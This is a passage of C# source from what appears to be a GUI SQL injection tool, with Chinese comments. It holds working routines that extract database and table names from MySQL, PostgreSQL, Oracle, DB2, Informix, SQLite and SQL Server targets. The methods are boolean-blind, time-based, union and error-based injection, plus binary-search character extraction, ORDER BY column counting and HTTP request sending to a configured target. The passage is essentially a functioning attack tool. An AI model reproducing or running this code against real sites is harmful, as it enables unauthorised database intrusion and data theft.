        public void getDBNameByErrorByPostgreSQL(Object oindex)
        {
            try
            {
                String result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.db_value.Replace("{index}", oindex.ToString())));
                //HTML解码
                result = HttpUtility.HtmlDecode(result);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Error方式oracle
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByErrorByOracle(Object oindex)
        {
            try
            {
                String result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.db_value, "", "", oindex.ToString()));
                //HTML解码
                result = HttpUtility.HtmlDecode(result);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }



        /// <summary>
        /// bool方式获取mysql表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolByMySQL(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = MySQL.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit + "");
                int len = 0;
                if (config.keyType.Equals(KeyType.Time))
                {
                    len = getValue(MySQL.getBoolDataBySleep(MySQL.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                }
                else
                {
                    len = getValue(MySQL.ver_length.Replace("{data}", data_payload), 1, 50);
                }


                //判断当前数据库对应的ascii码
                String va_payload = MySQL.ver_value.Replace("{data}", data_payload);
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = MySQL.getBoolDataBySleep(MySQL.bool_value, config.maxTime).Replace("{data}", data_payload);
                }

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// bool方式获取mysql表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolByPostgreSQL(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = PostgreSQL.table_value.Replace("'{dbname}'", Tools.strToChr(sn.dbname, "UTF-8")).Replace("{index}", sn.limit + "");
                int len = 0;
                if (config.keyType.Equals(KeyType.Time))
                {
                    len = getValue(PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                }
                else
                {
                    len = getValue(PostgreSQL.ver_length.Replace("{data}", data_payload), 1, 50);
                }


                //判断当前数据库对应的ascii码
                String va_payload = PostgreSQL.ver_value.Replace("{data}", data_payload);
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_value, config.maxTime).Replace("{data}", data_payload);
                }

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// bool方式获取oracle表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolByOracle(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = Oracle.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit + "");
                int len = getValue(Oracle.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = Oracle.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// bool方式获取DB2表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolByDB2(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = DB2.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit + "");
                int len = getValue(DB2.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = DB2.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// bool方式获取Informix表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolByInformix(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = Informix.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit + "");

                //判断当前数据库对应的ascii码
                String va_payload = Informix.bool_value.Replace("{data}", data_payload);

                int len = 0;
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = Informix.getBoolDataBySleep(Informix.bool_value).Replace("{data}", data_payload);
                    len = getValue(Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", data_payload)), 1, 50);
                }
                else
                {
                    len = getValue(Informix.bool_length.Replace("{data}", data_payload), 1, 50);
                }

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// bool方式获取表
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByBoolBySQLite(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                int selectIndex = sn.tn.Index;
                //判断当前表长度
                String data_payload = SQLite.table_value.Replace("{index}", sn.limit + "");
                int len = getValue(SQLite.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = SQLite.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }



        public void getTableNameValueByBoolBySQLServerSleep(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = SQLServer.table_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname);
                int len = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", data_payload), config.maxTime), 0, 10);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                    //取unicode转换后的长度
                    String unicode_data_len_payload = SQLServer.bool_length.Replace("{data}", unicode_data_payload);

                    //长度范围2-8支持大部分语言
                    int unicode_data_len = getValue(SQLServer.getBoolDataBySleep(unicode_data_len_payload, config.maxTime), 1, 8);
                    int m_index = 1;
                    StringBuilder unicodes = new StringBuilder();
                    while (m_index <= unicode_data_len)
                    {
                        //获取多字节
                        String substr_payload = SQLServer.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                        //单个unicode值范围是0-9
                        int unicode = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_value.Replace("{data}", substr_payload), config.maxTime), 0, 9);
                        unicodes.Append(unicode.ToString());
                        m_index++;
                    }

                    if (Tools.convertToInt(unicodes.ToString()) > 255)
                    {
                        value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                    }
                    else
                    {
                        value += (char)Tools.convertToInt(unicodes.ToString());
                    }
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }


        public void getTableNameValueByBoolBySQLServer(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = SQLServer.table_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname);
                int len = getValueByStepUp(SQLServer.bool_length.Replace("{data}", data_payload), 0, 10);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);

                    //根据unicode值得长度确定范围在判断，提高效率
                    for (int j = 3; j <= 7; j++)
                    {
                        Boolean isLarge = checkLen(SQLServer.check_li_value.Replace("{data}", unicode_data_payload), j);
                        if (isLarge)
                        {
                            int end = (int)Math.Pow(10, j - 1) - 1;
                            int unicode = getValue(SQLServer.bool_value.Replace("{data}", unicode_data_payload), 0, end);
                            value += Tools.unHexByUnicode(unicode, config.db_encoding);
                            break;
                        }
                    }
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);

                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentTableCount);
        }



        /// <summary>
        /// 获取表名，多线程调用mysql
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionByMySQL(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            data_list.Add(MySQL.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
            String tables_value_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
            String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", tables_value_payload));

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }
        /// <summary>
        /// 获取表名，多线程调用sqlserver
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionBySQLServer(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.table_value, sn.dbname, sn.tableName, sn.limit.ToString());
            String result = getOneDataByUnionOrError(tables_value_payload);

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// 获取表名，多线程调用sqlite
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionBySQLite(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLite.table_value.Replace("{index}", sn.limit.ToString()));
            String result = getOneDataByUnionOrError(tables_value_payload);

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// 获取表名，多线程调用Oracle
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionByOracle(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.table_value, sn.dbname, "", sn.limit.ToString());
            String result = getOneDataByUnionOrError(tables_value_payload);

            this.txt_log.Invoke(new showLogDelegate(log), "用户" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }


        /// <summary>
        /// 获取表名，多线程调用db2
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionByDB2(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.table_value, sn.dbname, "", sn.limit.ToString());
            String result = getOneDataByUnionOrError(tables_value_payload);

            this.txt_log.Invoke(new showLogDelegate(log), "数据库表模式" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        /// <summary>
        /// 获取表名，多线程调用Informix
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionByInformix(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.table_value, sn.dbname, "", sn.limit.ToString(), Informix.cast_value);
            String result = getOneDataByUnionOrErrorByInformix(tables_value_payload);

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }


        /// <summary>
        /// 获取表名，多线程调用PostgreSQL
        /// </summary>
        /// <param name="osn"></param>
        public void getTableNameValueByUnionByPostgreSQL(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            String tables_value_payload = PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.table_value.Replace("'{dbname}'", Tools.strToChr(sn.dbname, "UTF-8")), sn.dbname, "", sn.limit.ToString());
            String result = getOneDataByUnionOrError(tables_value_payload);

            this.txt_log.Invoke(new showLogDelegate(log), "用户" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        public void getTableNameValueByErrorByMySQL(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            data_list.Add(MySQL.table_value.Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString()));
            String table_value_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
            String result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", table_value_payload));

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        public void getTableNameValueByErrorBySQLServer(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            String result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit.ToString())));

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        public void getTableNameValueByErrorByPostgreSQL(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            String result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.table_value.Replace("'{dbname}'", Tools.strToChr(sn.dbname, "UTF-8")).Replace("{index}", sn.limit.ToString())));

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        public void getTableNameValueByErrorByOracle(Object osn)
        {

            SelectNode sn = (SelectNode)osn;
            List<String> data_list = new List<String>();
            String result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.table_value, sn.dbname, "", sn.limit.ToString()));

            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
            Interlocked.Increment(ref this.currentTableCount);
        }

        delegate void setNodeToTreeListDelegate(TreeNode tn, int index, String text);

        public void setNodeToTreeList(TreeNode tn, int index, String text)
        {
            TreeNode stn = tn.Nodes[index];
            stn.Text = text;
        }


        delegate void addNodeToTreeListDelegate(TreeNode tn, String text, String type);

        public void addNodeToTreeList(TreeNode tn, String text, String type)
        {
            TreeNode stn = new TreeNode(text);
            stn.Tag = type;
            if ("dbs".Equals(type))
            {
                stn.ImageIndex = 4;
            }
            else if ("table".Equals(type))
            {
                stn.ImageIndex = 1;
            }
            else if ("column".Equals(type))
            {
                stn.ImageIndex = 2;
            }
            tn.Nodes.Add(stn);
            tn.Expand();
        }

        /// <summary>
        /// 用betweent绕过大于
        /// 方法废弃，修改为StringReplace中自动处理
        /// </summary>
        /// <param name="paylaod"></param>
        /// <returns></returns>
        private String ByPassForBetween(String paylaod, int len)
        {
            /*
            String newpayload = "";
            if (config.useBetweenByPass)
            {

                if (newpayload.IndexOf(">=") != -1)
                {
                    newpayload = newpayload.Replace(">=", " not between 0 and " + (len - 1));
                }
                else if (newpayload.IndexOf(">") != -1)
                {
                    newpayload = newpayload.Replace(">", " not between 0 and " + len);
                }
                else if (newpayload.IndexOf("=") != -1)
                {
                    newpayload = newpayload.Replace("=", " between " + len + " and " + len);
                }
                else if (paylaod.IndexOf("<") != -1)
                {
                    newpayload = newpayload.Replace("<=", " between 0 and " + len);
                }
                else if (paylaod.IndexOf("<") != -1)
                {
                    newpayload = newpayload.Replace("<", " between 0 and " + (len - 1));
                }
            }
            else {
                newpayload = paylaod.Replace("{len}", len + "");
            }*/
            return paylaod.Replace("{len}", len + "");
        }

        /// <summary>
        /// 二分法判断
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        /// <summary>
        /// 二分法判断
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        public int getValue(String payLoadStr, int start, int end)
        {
            int len = 0;
            String payload = "";
            int min = start;
            int olen = 0;
            Boolean lastexists = false;
            while (status == 1)
            {
                //2分法获取中间数字
                len = Tools.getLargeNum(start, end);

                payload = ByPassForBetween(payLoadStr, len);
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);

                if (end - start == 1)
                {
                    if (!lastexists && exists)
                    {
                        return end;
                    }
                    else if (lastexists && !exists)
                    {
                        return start;
                    }
                }
                if (len == start)
                {
                    if (exists)
                    {
                        return end;
                    }
                    else
                    {
                        return start;
                    }

                }

                olen = len;
                lastexists = exists;
                if (exists)
                {

                    start = len;
                }
                else
                {
                    end = len;
                }

            }
            return len;
        }

        public int getOrderByColumns(String payLoadStr, int start, int end)
        {
            int len = 0;
            String payload = "";
            int min = start;
            int olen = 0;
            //最小1是否报错，最大1000是否报错
            payload = ByPassForBetween(payLoadStr, 1);
            ServerInfo server_1 = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
            Boolean use_error = false;
            Boolean lastexists = false;
            payload = ByPassForBetween(payLoadStr, 1000);
            ServerInfo server_1000 = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

            if (server_1.code == 200 && server_1000.code == 500)
            {
                use_error = true;
            }

            while (status == 1)
            {
                //2分法获取中间数字
                len = Tools.getLargeNum(start, end);
                if (end - start == 1)
                {
                    if (lastexists)
                    {
                        return end;
                    }
                    return start;
                }
                payload = ByPassForBetween(payLoadStr, len);
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                Boolean exists = false;
                if (use_error)
                {
                    if (server.code != 500)
                    {
                        exists = true;
                    }
                }
                else
                {
                    exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
                }

                olen = len;
                lastexists = exists;

                if (exists)
                {
                    start = len;
                }
                else
                {
                    end = len;
                }
            }
            return len;
        }

        /// <summary>
        /// 二分法判断
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        public Boolean checkLen(String payLoadStr, int len)
        {

            String payload = ByPassForBetween(payLoadStr, len);
            ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
            Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
            return exists;

        }

        delegate void setDBToTreeListDelegate(int index, String dbname);
        public void setDBToTreeList(int index, String dbname)
        {
            TreeNode tn = this.data_tvw_dbs.Nodes[index];
            tn.Text = dbname;
        }

        delegate void addDBToTreeListDelegate(String dbName);
        public void addDBToTreeList(String dbName)
        {

            TreeNode tn = new TreeNode(dbName);
            tn.Tag = "dbs";
            this.data_tvw_dbs.Nodes.Add(tn);

        }


        /// <summary>
        /// 递增获取值
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        public int getValueByStepUp(String payLoadStr, int start, int step)
        {
            int len = 0;
            int starts = start;
            String payload = "";
            while (status == 1)
            {
                payload = ByPassForBetween(payLoadStr, start);
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                if (Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode))
                {
                    start += step;
                }
                else
                {

                    //确定范围了
                    int s = start - step;
                    if (start <= 0)
                    {
                        break;
                    }
                    else
                    {
                        len = getValue(payLoadStr, s, start);
                        break;
                    }
                }
            }
            return len;
        }

        public delegate void sendHTTPLogDelegate(String index, ServerInfo server, String payload, String proxy);

        public void sendHTTPLog(String index, ServerInfo server, String payload, String proxy)
        {
            ListViewItem lvi = new ListViewItem(index);
            lvi.Tag = index;

            lvi.SubItems.Add(payload);
            lvi.SubItems.Add(server.runTime + "");
            lvi.SubItems.Add(server.code + "");
            lvi.SubItems.Add(server.length + "");
            lvi.SubItems.Add(server.sleepTime.ToString());
            lvi.SubItems.Add(proxy);
            this.log_lvw_httpLog.Items.Add(lvi);
        }


        public Boolean findKeyInBody(String payLoadStr, int num)
        {

            String payload = ByPassForBetween(payLoadStr, num); ;
            while (status == 1)
            {
                ServerInfo server = null;
                int tryCount = 0;
                while (tryCount <= config.reTry)
                {
                    try
                    {
                        server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        break;
                    }
                    catch (Exception e)
                    {
                        tryCount++;
                        this.txt_log.Invoke(new showLogDelegate(log), "发包失败！异常：" + e.Message, LogLevel.error);
                    }
                }
                if (server == null)
                {
                    return false;
                }

                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);

            }
            return false;

        }

        public Boolean findKeyInBody(String payLoadStr)
        {
            while (true)
            {
                ServerInfo server = null;
                int tryCount = 0;
                while (tryCount <= config.reTry)
                {
                    try
                    {
                        server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payLoadStr, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        break;
                    }
                    catch (Exception e)
                    {
                        tryCount++;
                        this.txt_log.Invoke(new showLogDelegate(log), "发包失败！异常：" + e.Message, LogLevel.error);
                    }
                }
                if (server == null)
                {
                    return false;
                }

                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);

            }

        }

        public delegate void StringDelegate(String str);

        public delegate void showLogDelegate(String log, LogLevel level);
        public void log(String log, LogLevel level)
        {
            if (config.isOpenInfoLog)
            {
                if (this.txt_log.Text.Length > 10240)
                {
                    this.txt_log.Text = "";
                }
                Color c = Color.DimGray;
                if (level.Equals(LogLevel.error))
                {
                    c = Color.Red;
                }
                else if (level.Equals(LogLevel.success))
                {
                    c = Color.Green;
                }
                else if (level.Equals(LogLevel.waring))
                {
                    c = Color.SandyBrown;
                }
                this.txt_log.SelectionStart = this.txt_log.Text.Length;//设置插入符位置为文本框末
                this.txt_log.SelectionColor = c;//设置文本颜色
                this.txt_log.AppendText(log + "----" + DateTime.Now + Environment.NewLine);
                this.txt_log.ScrollToCaret();//滚动条滚到到最新插入行

            }
        }

        public Boolean isSetInjectPoint()
        {

            if (this.txt_inject_request.Text.IndexOf(setInjectStr) == -1)
            {
                MessageBox.Show("未设置注入点！");
                return false;
            }
            else
            {
                return true;
            }

        }


        private void btn_inject_setInject_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = this.txt_inject_request.Text.Insert(this.txt_inject_request.SelectionStart, setInjectStr);
        }

        private void btn_inject_setEncodingRange_Click(object sender, EventArgs e)
        {

            this.txt_inject_request.SelectedText = "<Encode>" + this.txt_inject_request.SelectedText + "</Encode>";
        }

        AddNode an = null;

        private void data_dbs_tsmi_deleteNode_Click(object sender, EventArgs e)
        {
            if (this.data_tvw_dbs.SelectedNode != null)
            {

